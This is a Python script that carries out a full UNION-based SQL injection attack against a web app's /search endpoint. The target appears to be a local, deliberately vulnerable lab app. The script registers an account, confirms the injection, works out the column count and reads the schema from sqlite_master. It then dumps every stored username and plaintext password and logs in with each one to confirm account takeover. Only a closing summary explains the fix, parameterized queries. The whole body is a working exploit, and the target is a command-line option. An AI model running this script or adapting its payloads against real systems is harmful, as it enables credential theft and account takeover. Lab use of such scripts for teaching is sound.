#!/usr/bin/env python3
"""
SQL Injection — Classic (In-band) Attack
==========================================

this script demonstrates UNION-based SQL injection against the /search endpoint
the vulnerable code uses f-string interpolation to build raw SQL queries
so we can break out of the LIKE clause and append our own SELECT statements

the attack has 5 phases:
  phase 0: register a throwaway account to get past the login wall
  phase 1: confirm the injection works by comparing result counts
  phase 2: find how many columns the query returns (needed for UNION)
  phase 3: read the database schema from sqlite_master
  phase 4: dump every username and password from the users table
  phase 5: verify each stolen credential by actually logging in

usage:
    python3 scripts/sqli_classic.py
    python3 scripts/sqli_classic.py --target http://127.0.0.1:5000
"""

import argparse
import re
import sys
import time
import html as html_lib  # we need html.unescape to decode &amp; etc from page output

try:
    import requests
except ImportError:
    print("Run: pip install requests")
    sys.exit(1)


# ──────────────────────────────────────────────
# config
# ──────────────────────────────────────────────

DEFAULT_TARGET = "http://127.0.0.1:5000"

# we generate a unique username using the last 6 digits of the current timestamp
# this way running the script multiple times won't clash with existing accounts
ATTACKER_USER = "sqli_" + str(int(time.time()))[-6:]
ATTACKER_PASS = "sqli_probe_2026"


# ──────────────────────────────────────────────
# terminal color codes for readable console output
# ──────────────────────────────────────────────

class C:
    R = "\033[91m"   # red — used for attack payloads and passwords
    G = "\033[92m"   # green — success messages
    Y = "\033[93m"   # yellow — warnings and important values
    CN = "\033[96m"  # cyan — info messages
    B = "\033[1m"    # bold
    D = "\033[2m"    # dim — secondary info
    M = "\033[95m"   # magenta
    X = "\033[0m"    # reset all formatting

def banner(t):
    """prints a section header with a box made of = characters"""
    print(f"\n{C.B}{'=' * 62}\n  {t}\n{'=' * 62}{C.X}")

def ok(m):   print(f"  {C.G}[+]{C.X} {m}")
def fail(m): print(f"  {C.R}[-]{C.X} {m}")
def info(m): print(f"  {C.CN}[*]{C.X} {m}")
def warn(m): print(f"  {C.Y}[!]{C.X} {m}")


def is_login_page(text):
    """checks if the response is the login page instead of actual content
    this happens when our session expires or we're not authenticated"""
    return "<title>Login</title>" in text and 'name="username"' in text


def search(session, target, payload):
    """sends a search query to /search?q=<payload> and returns (result_count, html)
    if we got redirected to login (session expired), result_count is -1
    we parse the result count from the "Found <strong>N</strong>" text in the page"""
    resp = session.get(f"{target}/search", params={"q": payload}, timeout=10)

    # if we landed on the login page, our session is dead
    if is_login_page(resp.text):
        return -1, resp.text

    # the template shows "Found <strong>5</strong> result(s)"
    # we extract that number to know how many rows the query returned
    m = re.search(r'Found <strong[^>]*>(\d+)</strong>', resp.text)
    count = int(m.group(1)) if m else 0
    return count, resp.text


def extract_debug_sql(html):
    """the vulnerable app shows the executed SQL in a debug box on the page
    we extract it so the attacker can see exactly what query ran
    this is an information disclosure vulnerability on its own"""
    m = re.search(r'DEBUG.*?Executed SQL:</span>\s*<pre[^>]*>(.*?)</pre>', html, re.DOTALL)
    return html_lib.unescape(m.group(1).strip()) if m else None


def extract_error(html):
    """when our SQL payload has a syntax error, the app shows the raw database error
    this helps us debug our payloads — in a real app these errors would be hidden"""
    m = re.search(r'Database Error.*?<pre[^>]*>(.*?)</pre>', html, re.DOTALL)
    return html_lib.unescape(m.group(1).strip()) if m else None


def extract_cards(html):
    """parses the search result cards from the HTML response

    each card in the template has this structure:
        <span...>#ROW[0]</span>         ← id (shown as #5, #12, etc)
              ROW[1]                     ← title (the note's title or our injected data)
        <span...>ROW[3]</span>          ← category (the pill badge)
        <p...>ROW[2]</p>                ← content preview

    when we do UNION SELECT, we control what goes in each position
    so we put the data we want to steal in the title and content slots"""
    cards = []
    
    # find every card div — they all start with background:#161b22
    card_pattern = re.compile(
        r'<div style="background:#161b22.*?</div>\s*</div>',
        re.DOTALL
    )
    
    for card_html in card_pattern.findall(html):
        # extract the id from the #xxx span
        id_m = re.search(r'>#(\S+?)</span>', card_html)
        # title sits between the id span's closing tag and the h3 closing tag
        title_m = re.search(r'</span>\s*\n?\s*(.*?)\s*</h3>', card_html, re.DOTALL)
        # category is in the span with border-radius:10px (the pill badge)
        cat_m = re.search(r'border-radius:10px[^>]*>(.*?)</span>', card_html)
        # content is in the paragraph tag with the specific font-size style
        content_m = re.search(r'<p style="color:#8b949e; font-size:0\.9rem[^>]*>(.*?)</p>', card_html, re.DOTALL)
        
        # unescape html entities like &amp; -> & and &lt; -> <
        row_id = html_lib.unescape(id_m.group(1).strip()) if id_m else ""
        title = html_lib.unescape(title_m.group(1).strip()) if title_m else ""
        category = html_lib.unescape(cat_m.group(1).strip()) if cat_m else ""
        content = html_lib.unescape(content_m.group(1).strip()) if content_m else ""
        
        cards.append((row_id, title, category, content))
    
    return cards


# ──────────────────────────────────────────────
# phase 0 — authenticate
# we need a valid session to access /search
# the app requires login for everything except /login and /register
# ──────────────────────────────────────────────

def phase0_auth(session, target):
    banner("PHASE 0 — Authenticate")
    info(f"Creating throwaway account: '{ATTACKER_USER}'")

    try:
        # register a fresh account — we don't need admin, any user can search
        resp = session.post(f"{target}/register", data={
            "username": ATTACKER_USER,
            "password": ATTACKER_PASS,
            "confirm": ATTACKER_PASS,
        }, allow_redirects=True, timeout=5)

        # if registration redirected us to login (username taken), try logging in
        if is_login_page(resp.text):
            resp = session.post(f"{target}/login", data={
                "username": ATTACKER_USER,
                "password": ATTACKER_PASS,
            }, allow_redirects=True, timeout=5)
            if is_login_page(resp.text):
                fail("Authentication failed")
                return False

        ok(f"Authenticated as '{ATTACKER_USER}'")
        return True
    except requests.exceptions.ConnectionError:
        fail(f"Cannot connect to {target}")
        return False


# ──────────────────────────────────────────────
# phase 1 — confirm injection works
# we compare a normal search result count against an injected one
# if ' OR 1=1 -- returns more rows than 'test', injection is confirmed
# ──────────────────────────────────────────────

def phase1_test(session, target):
    banner("PHASE 1 — Test Basic Injection")

    # first do a normal search to get a baseline result count
    info("Normal search: q=test")
    normal_count, _ = search(session, target, "test")
    info(f"  Results: {normal_count}")

    # now inject ' OR 1=1 -- which makes the WHERE clause always true
    # the single quote closes the LIKE string, OR 1=1 matches every row,
    # and -- comments out the rest of the original query
    payload = "' OR 1=1 --"
    info(f"Injection:  q={C.R}{payload}{C.X}")
    inj_count, html = search(session, target, payload)

    # check if the debug SQL box shows our injected query
    sql = extract_debug_sql(html)
    if sql:
        info(f"  Executed SQL: {C.D}{sql[:120]}...{C.X}")

    # if the injected query returned more rows, the injection works
    if inj_count > normal_count:
        ok(f"Injection works! {C.Y}{inj_count}{C.X} results (vs {normal_count} normal)")
        return True
    
    # even if result counts didn't change, a SQL error means injection is possible
    # the error tells us the query structure which we can use to refine our payload
    error = extract_error(html)
    if error:
        warn(f"SQL error leaked: {error[:100]}")
        return True
    
    fail("Injection did not change results")
    return False


# ──────────────────────────────────────────────
# phase 2 — determine column count
# UNION SELECT requires the exact same number of columns as the original query
# we increment ORDER BY until the database throws an error
# ORDER BY 6 fails -> the query has 5 columns
# ──────────────────────────────────────────────

def phase2_columns(session, target):
    banner("PHASE 2 — Determine Column Count")
    info("Incrementing ORDER BY until error...\n")

    for n in range(1, 15):
        _, html = search(session, target, f"' ORDER BY {n} --")
        # when n exceeds the column count, sqlite throws an error
        if extract_error(html):
            count = n - 1  # the last successful n is the column count
            ok(f"ORDER BY {n} failed -> table has {C.Y}{count}{C.X} columns")
            return count
        info(f"  ORDER BY {n} -> OK")

    # if we get here without an error something is wrong, but 5 is a safe guess
    # for this specific app since the notes table has 5 columns
    warn("Could not determine count, assuming 5")
    return 5


# ──────────────────────────────────────────────
# phase 3 — read database schema via UNION SELECT on sqlite_master
# sqlite_master is a special table that every sqlite database has
# it contains the CREATE TABLE statements for every table
# so we can see all table names, column names, and types
# ──────────────────────────────────────────────

def phase3_schema(session, target):
    banner("PHASE 3 — Discover Database Schema")
    info("Reading sqlite_master via UNION SELECT...\n")

    # the original query returns 5 columns: id, title, content, category, created_at
    # our UNION must also return 5 columns, so we map:
    #   column 0 (id)         -> 0 (dummy value)
    #   column 1 (title)      -> tbl_name (table name — shown as the card title)
    #   column 2 (content)    -> sql (CREATE TABLE statement — shown as card content)
    #   column 3 (category)   -> '__schema__' (marker so we can filter our injected rows)
    #   column 4 (created_at) -> 0 (dummy value)
    payload = "' UNION SELECT 0,tbl_name,sql,'__schema__',0 FROM sqlite_master WHERE type='table' --"
    info(f"Payload: {C.R}{payload}{C.X}\n")

    _, html = search(session, target, payload)
    cards = extract_cards(html)

    # separate our injected schema rows from real note results
    # we tagged them with '__schema__' in the category position
    tables = {}
    for row_id, title, category, content in cards:
        if category == "__schema__":
            tables[title] = content  # title=table_name, content=CREATE TABLE sql

    if tables:
        ok(f"Found {C.Y}{len(tables)}{C.X} table(s):\n")
        for name, create_sql in tables.items():
            print(f"  {C.Y}TABLE: {name}{C.X}")
            if create_sql:
                # parse column names and types from the CREATE TABLE statement
                cols = re.findall(r'(\w+)\s+([\w()]+)', create_sql)
                for col_name, col_type in cols:
                    # skip SQL keywords that the regex accidentally captures
                    if col_name.upper() in ('CREATE', 'TABLE', 'NOT', 'NULL', 'PRIMARY', 'KEY', 'DEFAULT', 'UNIQUE'):
                        continue
                    # highlight the password column because it is stored as plaintext
                    marker = f"{C.R}  ← PLAINTEXT!{C.X}" if col_name == 'password' else ""
                    print(f"    {C.D}├─{C.X} {col_name} ({col_type}){marker}")
            print()
    else:
        warn("Could not parse schema from HTML, dumping raw cards:")
        for c in cards:
            print(f"    {c}")

    return tables


# ──────────────────────────────────────────────
# phase 4 — dump credentials from the users table
# now that we know the table has username, password, and role columns
# we can UNION SELECT them directly into the search results
# ──────────────────────────────────────────────

def phase4_dump(session, target):
    banner("PHASE 4 — Dump User Credentials")
    info("Reading users table via UNION SELECT...\n")

    # map users columns into the 5-column query:
    #   column 0 -> 0 (dummy id)
    #   column 1 -> username (appears as card title)
    #   column 2 -> password (appears as card content — plaintext!)
    #   column 3 -> role (appears as category badge — 'admin' or 'user')
    #   column 4 -> 0 (dummy created_at)
    payload = "' UNION SELECT 0,username,password,role,0 FROM users --"
    info(f"Payload: {C.R}{payload}{C.X}\n")

    _, html = search(session, target, payload)
    cards = extract_cards(html)

    # filter our injected user rows from normal note results
    # user rows have 'admin' or 'user' in the category position
    credentials = []
    for row_id, title, category, content in cards:
        if category in ('admin', 'user'):
            credentials.append((title, content, category))  # username, password, role

    if credentials:
        # print a nice table of stolen credentials
        print(f"  {C.B}{'USERNAME':<20}{'PASSWORD':<25}{'ROLE':<10}{C.X}")
        print(f"  {'─' * 55}")
        for username, password, role in credentials:
            role_color = C.R if role == 'admin' else C.D
            print(f"  {C.Y}{username:<20}{C.X}{C.R}{password:<25}{C.X}{role_color}{role:<10}{C.X}")
        print(f"\n  {C.B}Total: {len(credentials)} credentials dumped{C.X}")
    else:
        warn("Could not parse credentials, dumping all cards:")
        for c in cards:
            print(f"    {c}")

    return credentials


# ──────────────────────────────────────────────
# phase 5 — verify stolen credentials
# we try to actually log in with each stolen username+password pair
# this proves the credentials are real and usable, not just database artifacts
# ──────────────────────────────────────────────

def phase5_verify(target, credentials):
    banner("PHASE 5 — Verify Stolen Credentials")
    info(f"Testing {len(credentials)} credentials...\n")

    verified = 0
    for username, password, role in credentials:
        # use a fresh session for each verification attempt
        # we don't want cookies from previous logins interfering
        s = requests.Session()
        resp = s.post(f"{target}/login", data={
            "username": username, "password": password,
        }, allow_redirects=False, timeout=5)

        # 302 redirect means login succeeded (server redirects to welcome page)
        # 200 means the login page was re-rendered with an error (login failed)
        if resp.status_code == 302:
            ok(f"{C.G}VERIFIED{C.X}  {C.Y}{username}{C.X}:{C.R}{password}{C.X}  (role: {role})")
            verified += 1
            # log out so we don't leave sessions hanging
            try: s.get(f"{target}/logout", timeout=3)
            except: pass
        else:
            fail(f"FAILED   {username}:{password}")

    print(f"\n  {verified}/{len(credentials)} credentials verified")
    return verified


# ──────────────────────────────────────────────
# summary — shows the attack chain and the fix
# ──────────────────────────────────────────────

def print_summary(cred_count):
    banner("ATTACK SUMMARY")
    print(f"""
  {C.B}Attack chain:{C.X}

  Register -> Search box -> {C.R}' OR 1=1 --{C.X} -> Confirm injection
       ↓
  {C.R}' ORDER BY n --{C.X} -> Find column count (5)
       ↓
  {C.R}' UNION SELECT ... FROM sqlite_master --{C.X} -> Read all table schemas
       ↓
  {C.R}' UNION SELECT ... FROM users --{C.X} -> Dump {cred_count} credentials
       ↓
  Login with stolen credentials -> Full account takeover

  {C.Y}Root cause:{C.X}
    sql = f"SELECT ... WHERE title LIKE '%{{q}}%'"
    User input goes directly into SQL via f-string.

  {C.Y}Fix:{C.X}
    sql = "SELECT ... WHERE title LIKE :q"
    db.session.execute(text(sql), {{"q": f"%{{q}}%"}})
    Or just use the ORM: Note.query.filter(Note.title.like(f"%{{q}}%"))
""")


# ──────────────────────────────────────────────
# main — runs all phases in sequence
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="SQL Injection — Classic (In-band)")
    parser.add_argument("--target", default=DEFAULT_TARGET)
    args = parser.parse_args()
    target = args.target.rstrip("/")  # remove trailing slash to avoid double slashes in URLs

    print(f"""
{C.B}{C.CN}
  ███████╗ ██████╗ ██╗     ██╗
  ██╔════╝██╔═══██╗██║     ██║
  ███████╗██║   ██║██║     ██║
  ╚════██║██║▄▄ ██║██║     ██║
  ███████║╚██████╔╝███████╗██║
  ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝
{C.X}
  {C.D}Classic (In-band) SQL Injection via UNION SELECT{C.X}
  {C.D}Target: {target}{C.X}
""")

    session = requests.Session()

    if not phase0_auth(session, target):
        sys.exit(1)

    if not phase1_test(session, target):
        fail("Injection test failed — is /search endpoint in app.py?")
        sys.exit(1)

    col_count = phase2_columns(session, target)
    info(f"Using {col_count} columns for UNION payloads\n")

    tables = phase3_schema(session, target)

    credentials = phase4_dump(session, target)
    if not credentials:
        fail("Could not extract credentials")
        sys.exit(1)

    phase5_verify(target, credentials)
    print_summary(len(credentials))


if __name__ == "__main__":
    main()
